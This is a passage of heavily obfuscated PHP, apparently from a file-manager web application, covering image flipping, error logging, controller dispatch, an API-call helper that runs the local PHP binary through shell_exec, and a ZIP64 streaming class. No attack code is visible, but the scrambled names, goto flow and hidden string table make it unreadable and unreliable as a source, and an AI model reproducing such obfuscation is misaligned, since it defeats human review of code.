($F…ÏÔ∏ò•¬ = 0; $F…ÏÔ∏ò•¬ < $b•çøúãüı; ++$F…ÏÔ∏ò•¬) { imagecopy($B´çè—¯Ïî, $A€π…Œ˜ã¶, 0, 0, 0, $F…ÏÔ∏ò•¬, $fÍ◊é·Î•Ç, 1); imagecopy($A€π…Œ˜ã¶, $A€π…Œ˜ã¶, 0, $F…ÏÔ∏ò•¬, 0, $Cå⁄≤´€È€ - $F…ÏÔ∏ò•¬, $fÍ◊é·Î•Ç, 1); imagecopy($A€π…Œ˜ã¶, $B´çè—¯Ïî, 0, $Cå⁄≤´€È€ - $F…ÏÔ∏ò•¬, 0, 0, $fÍ◊é·Î•Ç, 1); } break; case IMG_FLIP_BOTH: $fÍ◊é·Î•Ç = imagesx($A€π…Œ˜ã¶); $c ﬂ’’”¶⁄ = imagesy($A€π…Œ˜ã¶); $B´çè—¯Ïî = imagerotate($A€π…Œ˜ã¶, 180, 0); imagecopy($A€π…Œ˜ã¶, $B´çè—¯Ïî, 0, 0, 0, 0, $fÍ◊é·Î•Ç, $c ﬂ’’”¶⁄); break; default: return; } imagedestroy($B´çè—¯Ïî); } } goto Eìµõºñıê; bôä”¿âíˆ: function beforeShutdownError($AÆÂãÒõ⁄£ = false, $a¯‹àóπŒ = '', $eÚè≤Ûóöù = '', $BÕéÀí£·Œ = 0) { $b«ÆçØô√Æ =& $_SERVER[‚ﬁ]; switch ($AÆÂãÒõ⁄£) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $B»™Ë∑∂› = $b«ÆçØô√Æ[38]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $B»™Ë∑∂› = $b«ÆçØô√Æ[39]; break; case E_STRICT: $B»™Ë∑∂› = $b«ÆçØô√Æ[40]; break; case E_NOTICE: case E_USER_NOTICE: $B»™Ë∑∂› = $b«ÆçØô√Æ[41]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $B»™Ë∑∂› = $b«ÆçØô√Æ[42]; break; default: break; } if (!$B»™Ë∑∂› || $B»™Ë∑∂› == $b«ÆçØô√Æ[41] || $B»™Ë∑∂› == $b«ÆçØô√Æ[42]) { return; } $eÚè≤Ûóöù = $b«ÆçØô√Æ[4] . str_replace($_SERVER[$b«ÆçØô√Æ[36]], $b«ÆçØô√Æ[20], $eÚè≤Ûóöù); $Aßêóà ÏÁ = $B»™Ë∑∂› . $b«ÆçØô√Æ[43] . $a¯‹àóπŒ . $b«ÆçØô√Æ[43] . $eÚè≤Ûóöù . $b«ÆçØô√Æ[43] . $BÕéÀí£·Œ; write_log($Aßêóà ÏÁ . $b«ÆçØô√Æ[18] . get_caller_msg(1), $b«ÆçØô√Æ[19]); } $_SERVER[$_SERVER[‚ﬁ][44]] = $_SERVER[$_SERVER[‚ﬁ][36]] . $_SERVER[‚ﬁ][45]; $Eµ√ãÙØÑÜ = strrev(base64_decode($_SERVER[‚ﬁ][46])); goto EÂÂéåô∞ì; Aíì‰ïß»‰: function Action($aÜ„õú‰˜Ç = '') { goto bìì®îàﬂÕ; dëéí∆ƒ™‡: $e§≈ÍÑäÚâ = explode($E√∫ÖÙ™Ø[5], $aÜ„õú‰˜Ç); $E¶≠ÛÁéÚ± = strtolower($e§≈ÍÑäÚâ[0]); if (substr($E¶≠ÛÁéÚ±, -6) == $E√∫ÖÙ™Ø[6]) { $aÜ„õú‰˜Ç = substr($e§≈ÍÑäÚâ[0], 0, -6); $A‹ãÎˆ∏’ù = $aÜ„õú‰˜Ç . $E√∫ÖÙ™Ø[7]; $EêÜù•«¬⁄ = $E√∫ÖÙ™Ø[8]; if (isset($e§≈ÍÑäÚâ[1]) && substr(strtolower($e§≈ÍÑäÚâ[1]), -5) == $E√∫ÖÙ™Ø[9]) { $A‹ãÎˆ∏’ù = $aÜ„õú‰˜Ç . $e§≈ÍÑäÚâ[1]; $EêÜù•«¬⁄ = $E√∫ÖÙ™Ø[10] . $e§≈ÍÑäÚâ[1] . $E√∫ÖÙ™Ø[11]; } else { if (count($e§≈ÍÑäÚâ) == 3) { $A‹ãÎˆ∏’ù = $aÜ„õú‰˜Ç . $e§≈ÍÑäÚâ[1] . $e§≈ÍÑäÚâ[2]; $EêÜù•«¬⁄ = $E√∫ÖÙ™Ø[12] . $e§≈ÍÑäÚâ[1] . $E√∫ÖÙ™Ø[13] . $e§≈ÍÑäÚâ[2] . $E√∫ÖÙ™Ø[11]; } } $EêÜù•«¬⁄ = PLUGIN_DIR . $aÜ„õú‰˜Ç . $E√∫ÖÙ™Ø[4] . $EêÜù•«¬⁄; } else { if (substr($E¶≠ÛÁéÚ±, -5) == $E√∫ÖÙ™Ø[9]) { $aÜ„õú‰˜Ç = substr($e§≈ÍÑäÚâ[0], 0, -5); return Model($aÜ„õú‰˜Ç); } else { $A‹ãÎˆ∏’ù = $e§≈ÍÑäÚâ[0] . $e§≈ÍÑäÚâ[1]; $EêÜù•«¬⁄ = CONTROLLER_DIR . $e§≈ÍÑäÚâ[0] . $E√∫ÖÙ™Ø[4] . $e§≈ÍÑäÚâ[1] . $E√∫ÖÙ™Ø[14]; } } goto d˘Œ‘èöÍù; d˘Œ‘èöÍù: $e∆¥Øè¿¥Ö = strtolower($A‹ãÎˆ∏’ù); if (isset($E≠∂’àä≥õ[$e∆¥Øè¿¥Ö])) { return $E≠∂’àä≥õ[$e∆¥Øè¿¥Ö]; } if (is_file($EêÜù•«¬⁄)) { include_once $EêÜù•«¬⁄; } goto C‘óçåˆÔÑ; C‘óçåˆÔÑ: if (!class_exists($A‹ãÎˆ∏’ù)) { return actionCallError("\x5b{$aÜ„õú‰˜Ç}\40\x3d\76\40{$A‹ãÎˆ∏’ù}\x5d\40\143\x6c\x61\x73\163\40\x6e\157\164\x20\x65\170\x69\x73\x74\163\x21"); } $E≠∂’àä≥õ[$e∆¥Øè¿¥Ö] = new $A‹ãÎˆ∏’ù(); return $E≠∂’àä≥õ[$e∆¥Øè¿¥Ö]; goto EÎµìûùâÌ; bìì®îàﬂÕ: $E√∫ÖÙ™Ø =& $_SERVER[‚ﬁ]; static $E≠∂’àä≥õ = array(); $aÜ„õú‰˜Ç = trim(str_replace($E√∫ÖÙ™Ø[4], $E√∫ÖÙ™Ø[5], $aÜ„õú‰˜Ç), $E√∫ÖÙ™Ø[4]); goto dëéí∆ƒ™‡; EÎµìûùâÌ: } function ActionApply($D ë‘Ë√Çá, $c‘ãÛªä≠Ì = array()) { goto DâÃ∞ªØÎ±; A∞‘≥⁄±Ì¨: if (!method_exists($fÁì∏ïªÓ≠, $E·ÌÌõù∆·)) { return actionCallError("{$D ë‘Ë√Çá}\40\155\145\164\150\x6f\x64\x20\156\157\x74\x20\145\170\151\163\164\163\41"); } $EÍ‚Õ¶≥âŸ = call_user_func_array(array($fÁì∏ïªÓ≠, $E·ÌÌõù∆·), $c‘ãÛªä≠Ì); return $EÍ‚Õ¶≥âŸ; goto DÊ®éÏ£⁄Ë; B©•ú∆ÕÕÎ: $aÆè∆ÕÜàë = substr($D ë‘Ë√Çá, 0, $F∏‰Éú™ââ); $E·ÌÌõù∆· = substr($D ë‘Ë√Çá, $F∏‰Éú™ââ + 1); $fÁì∏ïªÓ≠ = Action($aÆè∆ÕÜàë); goto A∞‘≥⁄±Ì¨; DâÃ∞ªØÎ±: if (is_array($D ë‘Ë√Çá)) { return call_user_func_array($D ë‘Ë√Çá, $c‘ãÛªä≠Ì); } if (function_exists($D ë‘Ë√Çá)) { return call_user_func_array($D ë‘Ë√Çá, $c‘ãÛªä≠Ì); } $F∏‰Éú™ââ = strrpos($D ë‘Ë√Çá, $_SERVER[‚ﬁ][5]); goto B©•ú∆ÕÕÎ; DÊ®éÏ£⁄Ë: } function actionCallError($DıÊ‹∂Û¥’) { $bÜÛ◊∞»û· =& $_SERVER[‚ﬁ]; $D›˜ïé›•Â = json_encode_force(array($bÜÛ◊∞»û·[15] => this_url(), $bÜÛ◊∞»û·[16] => $GLOBALS[$bÜÛ◊∞»û·[16]])); $D›˜ïé›•Â = str_replace(array($bÜÛ◊∞»û·[17]), array($bÜÛ◊∞»û·[4]), $D›˜ïé›•Â); return write_log($DıÊ‹∂Û¥’ . $bÜÛ◊∞»û·[18] . $D›˜ïé›•Â, $bÜÛ◊∞»û·[19]); } goto C´âùæ∞±œ; C´âùæ∞±œ: function ActionCall($b¢ºº–äçÀ) { $D≠Æë—∏‹π = array_slice(func_get_args(), 1); return ActionApply($b¢ºº–äçÀ, $D≠Æë—∏‹π); } function ActionCallApi($AÑÇø÷ﬂÆ, $Fõ©Éê≈Ÿâ = '') { goto fïø∏øüô°; Cê©•πÆÛ–: $d∂Øç§≈ﬂÑ = json_decode($aè≈ƒœ⁄àÌ, !0); $CÛØ⁄ÇÖ§è = is_array($d∂Øç§≈ﬂÑ) ? $d∂Øç§≈ﬂÑ : array($F˜Ìô£≥¶[32] => null, $F˜Ìô£≥¶[33] => $aè≈ƒœ⁄àÌ); if (!$d∂Øç§≈ﬂÑ) { echo $aè≈ƒœ⁄àÌ; } goto fº ™≤Íà¥; E–§íºπÕº: $aÛÒ…öúë§ = phpBinCommand(); if ($aÛÒ…öúë§ && function_exists($F˜Ìô£≥¶[25])) { $cíàò†ÖÖÉ = $aÛÒ…öúë§ . $F˜Ìô£≥¶[26] . BASIC_PATH . $F˜Ìô£≥¶[27] . escapeshellarg($AÑÇø÷ﬂÆ); $aè≈ƒœ⁄àÌ = shell_exec($cíàò†ÖÖÉ); } if (!$aè≈ƒœ⁄àÌ) { $dèﬁåΩÉÆ∆ = stream_context_create(array($F˜Ìô£≥¶[28] => array($F˜Ìô£≥¶[29] => 20, $F˜Ìô£≥¶[30] => $F˜Ìô£≥¶[31]))); $aè≈ƒœ⁄àÌ = file_get_contents(app_host_get() . $AÑÇø÷ﬂÆ, !1, $dèﬁåΩÉÆ∆); } goto Cê©•πÆÛ–; fïø∏øüô°: $F˜Ìô£≥¶ =& $_SERVER[‚ﬁ]; $bÊô≠Ãü◊ô = $Fõ©Éê≈Ÿâ; if (is_array($Fõ©Éê≈Ÿâ)) { $bÊô≠Ãü◊ô = $F˜Ìô£≥¶[20]; foreach ($Fõ©Éê≈Ÿâ as $c†Éä†ºÖÛ => $cë∆∫ıõíø) { $cë∆∫ıõíø = is_array($cë∆∫ıõíø) ? json_encode($cë∆∫ıõíø) : $cë∆∫ıõíø; $cë∆∫ıõíø = is_bool($cë∆∫ıõíø) ? intval($cë∆∫ıõíø) : $cë∆∫ıõíø; $bÊô≠Ãü◊ô .= $F˜Ìô£≥¶[21] . $c†Éä†ºÖÛ . $F˜Ìô£≥¶[22] . rawurlencode($cë∆∫ıõíø); } } goto EœÃ£“ùúª; fº ™≤Íà¥: return $CÛØ⁄ÇÖ§è; goto A¿õ≈¨î˘Ç; EœÃ£“ùúª: $bãπ®ôë‡» = Action($F˜Ìô£≥¶[23])->accessToken(); $AÑÇø÷ﬂÆ = str_replace($F˜Ìô£≥¶[5], $F˜Ìô£≥¶[4], $AÑÇø÷ﬂÆ) . $F˜Ìô£≥¶[24] . $bãπ®ôë‡» . $bÊô≠Ãü◊ô; $aè≈ƒœ⁄àÌ = $F˜Ìô£≥¶[20]; goto E–§íºπÕº; A¿õ≈¨î˘Ç: } function ActionCallHook($aòµ€ôùÛ¯) { goto BÇÉ∑¿∏ °; aâ√©“øù’: $GLOBALS[$Cø¡ÚÖ“–ë[34]] = 1; $AæÂ≠ÿÜù› = ActionApply($aòµ€ôùÛ¯, $eå∞ÑÃ˜”); $CêﬁÈ≥ÿ‡¢ = ob_get_clean(); goto b◊õè‹«á⁄; b◊õè‹«á⁄: $AæÂ≠ÿÜù› = $CêﬁÈ≥ÿ‡¢ ? json_decode($CêﬁÈ≥ÿ‡¢, !0) : $AæÂ≠ÿÜù›; $GLOBALS[$Cø¡ÚÖ“–ë[34]] = 0; return $AæÂ≠ÿÜù›; goto Eƒ¬ÏÜØô≥; BÇÉ∑¿∏ °: $Cø¡ÚÖ“–ë =& $_SERVER[‚ﬁ]; ob_start(); $eå∞ÑÃ˜” = array_slice(func_get_args(), 1); goto aâ√©“øù’; Eƒ¬ÏÜØô≥: } goto b€Î≤¥ãÜÁ; BÚÛ÷¢ØÇ®: class ZipMake { const VERSION = "\60\x2e\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($E¯¢ç˜Æªˆ = null) { $C·§à∑¬ÎÈ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->outputStream = fopen($C·§à∑¬ÎÈ[1919], $C·§à∑¬ÎÈ[1192]); $this->outputName = $E¯¢ç˜Æªˆ; $this->needHeaders = !0; } public function addFile($Céﬁû∑â„û, $aò¥çÚ»Û ) { goto eıØß¬§∂“; Aà¯»•øÛ›: $this->addFileFooter($Céﬁû∑â„û, $Bœ√Á°íıõ, $C‰ìı‹πí‡, $b‹öü≠íêô, $dØô·‡ö¢≥, $Aª◊‡ƒé≤«); goto DÃ„ºö´Ç≈; FçÎÖ€çõ‹: $Aª◊‡ƒé≤« = $this->addFileHeader($Céﬁû∑â„û, $Bœ√Á°íıõ); $b‹öü≠íêô = $dØô·‡ö¢≥ = filesize($aò¥çÚ»Û ); $D´ô©∑á¯ë = fopen($aò¥çÚ»Û , $dﬂª÷°ãﬂù[1920]); goto AáÀÖ¡∂ì˘; eıØß¬§∂“: $dﬂª÷°ãﬂù =& $_SERVER[£¿ÌÙëü¡¯¯]; $Céﬁû∑â„û = $this->filterFilename($Céﬁû∑â„û); $Bœ√Á°íıõ = static::METHOD_STORE; goto FçÎÖ€çõ‹; AáÀÖ¡∂ì˘: while (!feof($D´ô©∑á¯ë)) { $Eï¯ ÒÑ∂Î = fread($D´ô©∑á¯ë, 1048576); $this->send($Eï¯ ÒÑ∂Î); } fclose($D´ô©∑á¯ë); $C‰ìı‹πí‡ = hexdec(hash_file($dﬂª÷°ãﬂù[1921], $aò¥çÚ»Û )); goto Aà¯»•øÛ›; DÃ„ºö´Ç≈: } public function addFileFromStream($F»Ö ¶≥úÙ, $B…âæ∏‰®Ñ) { goto dıÏ¬áΩÏ ; Aˆ‡∏‘Áõ¢: $this->addFileFooter($F»Ö ¶≥úÙ, $cÜÜªÔÑ´£, $F´ﬁ–é—õÆ, $f±ƒ˘ΩÈ°£, $e†ô’çÁ¯ì, $eó£ÍîÜ‰©); goto D≤ÃÓÒåéö; eó¥Œå•Ìª: $B’¢¥ÁÕü£ = hash_init($_SERVER[£¿ÌÙëü¡¯¯][1921]); while (!feof($B…âæ∏‰®Ñ)) { $bÉæÏÙú¢ç = fread($B…âæ∏‰®Ñ, 1048576); hash_update($B’¢¥ÁÕü£, $bÉæÏÙú¢ç); $this->send($bÉæÏÙú¢ç); } $F´ﬁ–é—õÆ = hexdec(hash_final($B’¢¥ÁÕü£)); goto Aˆ‡∏‘Áõ¢; dıÏ¬áΩÏ : $F»Ö ¶≥úÙ = $this->filterFilename($F»Ö ¶≥úÙ); $cÜÜªÔÑ´£ = static::METHOD_STORE; $eó£ÍîÜ‰© = $this->addFileHeader($F»Ö ¶≥úÙ, $cÜÜªÔÑ´£); goto D‹⁄»ÀÙ˘â; D‹⁄»ÀÙ˘â: fseek($B…âæ∏‰®Ñ, 0, SEEK_END); $f±ƒ˘ΩÈ°£ = $e†ô’çÁ¯ì = ftell($B…âæ∏‰®Ñ); rewind($B…âæ∏‰®Ñ); goto eó¥Œå•Ìª; D≤ÃÓÒåéö: } public function finish() { foreach ($this->files as $eëÖ¨®€√•) { $this->addCdrFile($eëÖ¨®€√•); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($CÇ∞™≈Îªç, $AŸ °ƒ§Ã∑) { goto AÍàô÷éø∏; Dú›∂≥—ﬁŸ: $d”ƒé√Ï§Ò = $this->dosTime(time()); $Fë™–éü’Ö = array(array($cÍúπ‘¶–…[1923], static::FILE_HEADER_SIGNATURE), array($cÍúπ‘¶–…[1924], static::ZIP_VERSION_64), array($cÍúπ‘¶–…[1924], 8), array($cÍúπ‘¶–…[1924], $AŸ °ƒ§Ã∑), array($cÍúπ‘¶–…[1923], $d”ƒé√Ï§Ò), array($cÍúπ‘¶–…[1923], 0), array($cÍúπ‘¶–…[1923], 4294967295), array($cÍúπ‘¶–…[1923], 4294967295), array($cÍúπ‘¶–…[1924], $Dõ’Ω´ á…), array($cÍúπ‘¶–…[1924], 32)); $D‡øªõ·öÂ = array(array($cÍúπ‘¶–…[1924], 1), array($cÍúπ‘¶–…[1924], 28), array($cÍúπ‘¶–…[1925], 0), array($cÍúπ‘¶–…[1925], 0), array($cÍúπ‘¶–…[1925], 0), array($cÍúπ‘¶–…[1923], 0)); goto f–™≥‹ºâ–; f–™≥‹ºâ–: $eæÔàƒ≥é≤ = $this->packFields($Fë™–éü’Ö); $F·ƒ∂Ω≥Ç = $this->packFields($D‡øªõ·öÂ); $this->send($eæÔàƒ≥é≤ . $CÇ∞™≈Îªç . $F·ƒ∂Ω≥Ç); goto cÒë“í∫ˆ¥; cÒë“í∫ˆ¥: return strlen($eæÔàƒ≥é≤) + $Dõ’Ω´ á… + strlen($F·ƒ∂Ω≥Ç); goto Bî»§éã≠±; AÍàô÷éø∏: $cÍúπ‘¶–… =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÇ∞™≈Îªç = preg_replace($cÍúπ‘¶–…[1922], $cÍúπ‘¶–…[33], $CÇ∞™≈Îªç); $Dõ’Ω´ á… = strlen($CÇ∞™≈Îªç); goto Dú›∂≥—ﬁŸ; Bî»§éã≠±: } protected function addFileFooter($eç‹å·…¥…, $døõÑ•ç¨å, $a›…Óﬁ–Ëô, $fòÿ·µóá, $fêá√™€ÖÈ, $eŸö∆¡¿€è) { $aª≠ﬂÙÛÌ≈ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B◊‰•ëâ¿ = array(array($aª≠ﬂÙÛÌ≈[1923], static::DATA_DESCRIPTOR_SIGNATURE), array($aª≠ﬂÙÛÌ≈[1923], $a›…Óﬁ–Ëô), array($aª≠ﬂÙÛÌ≈[1925], $fòÿ·µóá), array($aª≠ﬂÙÛÌ≈[1925], $fêá√™€ÖÈ)); $bøÆ»ªÔ¨Ê = $this->packFields($B◊‰•ëâ¿); $this->send($bøÆ»ªÔ¨Ê); $cŸıå¿¬ã = $eŸö∆¡¿€è + $fòÿ·µóá + $fÙÒ«Ü≈ôÒ; $this->addToCdr($eç‹å·…¥…, $døõÑ•ç¨å, $a›…Óﬁ–Ëô, $fòÿ·µóá, $fêá√™€ÖÈ, $cŸıå¿¬ã); } private function addToCdr($cé‡é¡Ò¨, $C‰£¨çÂ•Ã, $DÇ·ﬁÁ◊∏, $Dπ´«õª¿…, $d‚ß∞›˜Œ, $Fø®É¬á Ç) { $this->files[] = array($cé‡é¡Ò¨, $C‰£¨çÂ•Ã, $DÇ·ﬁÁ◊∏, $Dπ´«õª¿…, $d‚ß∞›˜Œ, $this->ofs); $this->ofs += $Fø®É¬á Ç; } protected function addCdrFile($CòÉˆäÔÈì) { goto C»¶¬·‰«≈; C»¶¬·‰«≈: $Eºñ°î´‹¬ =& $_SERVER[£¿ÌÙëü¡¯¯]; list($aç¯ıä˜ÑÉ, $eÇ–À√ƒ¡Û, $eÆáÎÎ»«œ, $e’¬ñ¡îÀÍ, $E∏ùπàù∂ã, $e°éÍâÒãÈ) = $CòÉˆäÔÈì; $Dﬁéù¶·¥Ã = $Eºñ°î´‹¬[33]; goto Aë˜êÇÂÌ¨; Dò›íπ◊Œê: $this->send($f§ÎàÓœÖ¥); $this->cdr_ofs += strlen($f§ÎàÓœÖ¥); goto dÌ‘™∫ö≤; c∂êë’ã£ª: $a∫‚–®Ø§© = $this->packFields($CæªÖìÊ¯Ñ); $Cî˜è’”ú• = $this->packFields($e∆√ôâÁÿ); $f§ÎàÓœÖ¥ = $a∫‚–®Ø§© . $aç¯ıä˜ÑÉ . $Dﬁéù¶·¥Ã . $Cî˜è’”ú•; goto Dò›íπ◊Œê; Aë˜êÇÂÌ¨: $F≥ë€ëå›≥ = $this->dosTime(time()); $CæªÖìÊ¯Ñ = array(array($Eºñ°î´‹¬[1923], static::CDR_FILE_SIGNATURE), array($Eºñ°î´‹¬[1924], static::ZIP_VERSION_64), array($Eºñ°î´‹¬[1924], static::ZIP_VERSION_64), array($Eºñ°î´‹¬[1924], 8), array($Eºñ°î´‹¬[1924], $eÇ–À√ƒ¡Û), array($Eºñ°î´‹¬[1923], $F≥ë€ëå›≥), array($Eºñ°î´‹¬[1923], $eÆáÎÎ»«œ), array($Eºñ°î´‹¬[1923], 4294967295), array($Eºñ°î´‹¬[1923], 4294967295), array($Eºñ°î´‹¬[1924], strlen($aç¯ıä˜ÑÉ)), array($Eºñ°î´‹¬[1924], 32), array($Eºñ°î´‹¬[1924], strlen($Dﬁéù¶·¥Ã)), array($Eºñ°î´‹¬[1924], 0), array($Eºñ°î´‹¬[1924], 0), array($Eºñ°î´‹¬[1923], 32), array($Eºñ°î´‹¬[1923], 4294967295)); $e∆√ôâÁÿ = array(array($Eºñ°î´‹¬[1924], 1), array($Eºñ°î´‹¬[1924], 28), array($Eºñ°î´‹¬[1925], $E∏ùπàù∂ã), array($Eºñ°î´‹¬[1925], $e’¬ñ¡îÀÍ), array($Eºñ°î´‹¬[1925], $e°éÍâÒãÈ), array($Eºñ°î´‹¬[1923], 0)); goto c∂êë’ã£ª; dÌ‘™∫ö≤: } protected function addCdr64Eof() { goto CÎ›óúØ‹’; CÎ›óúØ‹’: $FÿÔâ‡ã∏§ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eﬁÓüÙÖÏ” = count($this->files); $FÁπ¯Ùèëà = $this->cdr_ofs; goto b‹Ã¨Ôıˆü; BÔ©¶ã◊Öñ: $this->send($fá¿¬˘äıª); goto B≠Ú»‰¿†ü; b‹Ã¨Ôıˆü: $EÛ»ãí°ËÖ = $this->ofs; $a≥ ™ ˘©ü = array(array($FÿÔâ‡ã∏§[1923], static::ZIP64_CDR_EOF_SIGNATURE), array($FÿÔâ‡ã∏§[1925], 44), array($FÿÔâ‡ã∏§[1924], static::ZIP_VERSION_64), array($FÿÔâ‡ã∏§[1924], static::ZIP_VERSION_64), array($FÿÔâ‡ã∏§[1923], 0), array($FÿÔâ‡ã∏§[1923], 0), array($FÿÔâ‡ã∏§[1925], $eﬁÓüÙÖÏ”), array($FÿÔâ‡ã∏§[1925], $eﬁÓüÙÖÏ”), array($FÿÔâ‡ã∏§[1925], $FÁπ¯Ùèëà), array($FÿÔâ‡ã∏§[1925], $EÛ»ãí°ËÖ)); $fá¿¬˘äıª = $this->packFields($a≥ ™ ˘©ü); goto BÔ©¶ã◊Öñ; B≠Ú»‰¿†ü: } protected function addCdr64Locator() { goto DÏ‘º“™’™; F»∫çÖ‚ç£: $BÜ†´»ãÊÉ = $this->ofs; $aüö∞´¡ô∫ = array(array($Dâ˜â§åÆÑ[1923], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($Dâ˜â§åÆÑ[1923], 0), array($Dâ˜â§åÆÑ[1925], $BÜ†´»ãÊÉ + $e∏µıê∫˘á), array($Dâ˜â§åÆÑ[1923], 1)); $B±Ò√äô∆Ω = $this->packFields($aüö∞´¡ô∫); goto aåÁ†ƒå›ﬁ; aåÁ†ƒå›ﬁ: $this->send($B±Ò√äô∆Ω); goto Fó§€ÇïÊ“; DÏ‘º“™’™: $Dâ˜â§åÆÑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bﬂß√‚⁄îº = count($this->files); $e∏µıê∫˘á = $this->cdr_ofs; goto F»∫çÖ‚ç£; Fó§€ÇïÊ“: } protected function addCdrEof() { goto e’ƒ—õâ®⁄; EÜãî÷¶Øœ: $fèÓü„É˜Ú = $this->ofs; $FÕ›ŸÒà…£ = $EòËå÷ï∞ø[33]; $bùì∏‘ÃçÓ = array(array($EòËå÷ï∞ø[1923], static::CDR_EOF_SIGNATURE), array($EòËå÷ï∞ø[1924], 0), array($EòËå÷ï∞ø[1924], 0), array($EòËå÷ï∞ø[1924], $e¯ó∆úÒ†ë), array($EòËå÷ï∞ø[1924], $e¯ó∆úÒ†ë), array($EòËå÷ï∞ø[1923], 4294967295), array($EòËå÷ï∞ø[1923], 4294967295), array($EòËå÷ï∞ø[1924], strlen($FÕ›ŸÒà…£))); goto cïÓÉ–Ú€ﬁ; e’ƒ—õâ®⁄: $EòËå÷ï∞ø =& $_SERVER[£¿ÌÙëü¡¯¯]; $e¯ó∆úÒ†ë = count($this->files); $C“√¢ö≤ˆÀ = $this->cdr_ofs; goto EÜãî÷¶Øœ; cïÓÉ–Ú€ﬁ: $fÓ¶Ñ€º…∞ = $this->packFields($bùì∏‘ÃçÓ) . $FÕ›ŸÒà…£; $this->send($fÓ¶Ñ€º…∞); goto D–«∆≤Ü°ê; D–«∆≤Ü°ê: } protected function addCdr() { foreach ($this->files as $aË›Â˘ÙôÑ) { $this->addCdrFile($aË›Â˘ÙôÑ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $DÌÈ¨ñßµ√ =& $_SERVER[£¿ÌÙëü¡¯¯]; $d©Ωµ«Ïó¥ = $DÌÈ¨ñßµ√[199]; if ($this->outputName) { $B∏œ∫∏ÃèΩ = trim(str_replace(array($DÌÈ¨ñßµ√[114], $DÌÈ¨ñßµ√[55], $DÌÈ¨ñßµ√[96], $DÌÈ¨ñßµ√[68], $DÌÈ¨ñßµ√[214], $DÌÈ¨ñßµ√[716]), $DÌÈ¨ñßµ√[33], $this->outputName)); $b´¿ó¶∂É≤ = rawurlencode($B∏œ∫∏ÃèΩ); $d©Ωµ«Ïó¥ .= "\x3b\x20\x66\x69\x6c\x65\156\x61\x6d\145\52\x3d\165\164\x66\55\70\47\x27{$b´¿ó¶∂É≤}"; } $c∆ÌéΩÇ°Ï = array($DÌÈ¨ñßµ√[196] => $DÌÈ¨ñßµ√[1926], $DÌÈ¨ñßµ√[1927] => $d©Ωµ«Ïó¥, $DÌÈ¨ñßµ√[1928] => $DÌÈ¨ñßµ√[1929], $DÌÈ¨ñßµ√[1930] => $DÌÈ¨ñßµ√[1931], $DÌÈ¨ñßµ√[1932] => $DÌÈ¨ñßµ√[1933]); foreach ($c∆ÌéΩÇ°Ï as $C«◊áäßπå => $EµÉ¿≈ùûí) { header($C«◊áäßπå . $DÌÈ¨ñßµ√[878] . $EµÉ¿≈ùûí); } } protected function send($E∆òµÍó¿“) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $E∆òµÍó¿“); } protected final function dosTime($eıÃ†àñ∑Ô) { $E§ß›¶Ë»ª =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÍœ¬Î∫õ· = getdate($eıÃ†àñ∑Ô); if ($FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1632]] < 1980) { $FÍœ¬Î∫õ· = array($E§ß›¶Ë»ª[1632] => 1980, $E§ß›¶Ë»ª[1934] => 1, $E§ß›¶Ë»ª[1935] => 1, $E§ß›¶Ë»ª[1936] => 0, $E§ß›¶Ë»ª[1937] => 0, $E§ß›¶Ë»ª[1938] => 0); } $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1632]] -= 1980; return $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1632]] << 25 | $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1934]] << 21 | $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1935]] << 16 | $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1936]] << 11 | $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1937]] << 5 | $FÍœ¬Î∫õ·[$E§ß›¶Ë»ª[1938]] >> 1; } protected function packFields($a¶ßø‹ÑÆ…) { $däíË®ó–Ï =& $_SERVER[£¿ÌÙëü¡¯¯]; $dË‹ôÿÂ≈â = $däíË®ó–Ï[33]; $e…áä£º›– = array(); foreach ($a¶ßø‹ÑÆ… as $FõæíΩ“Öé) { $dË‹ôÿÂ≈â .= $FõæíΩ“Öé[0]; $e…áä£º›–[] = $FõæíΩ“Öé[1]; } array_unshift($e…áä£º›–, $dË‹ôÿÂ≈â); return call_user_func_array($däíË®ó–Ï[1939], $e…áä£º›–); } protected function filterFilename($d∆—Òß∂Ê≥) { $e°á†Æ≥¢è =& $_SERVER[£¿ÌÙëü¡¯¯]; return str_replace(array($e°á†Æ≥¢è[96], $e°á†Æ≥¢è[4], $e°á†Æ≥¢è[173], $e°á†Æ≥¢è[70], $e°á†Æ≥¢è[114], $e°á†Æ≥¢è[923], $e°á†Æ≥¢è[926], $e°á†Æ≥¢è[268]), $e°á†Æ≥¢è[71], $d∆—Òß∂Ê≥); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($BÂé¿‘≥π·) { $b—˘˘∆£ÑÊ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÃ√Á•∂Ò† = array($b—˘˘∆£ÑÊ[527] => array($b—˘˘∆£ÑÊ[29] => $b—˘˘∆£ÑÊ[1940], $b—˘˘∆£ÑÊ[258] => array($b—˘˘∆£ÑÊ[207], 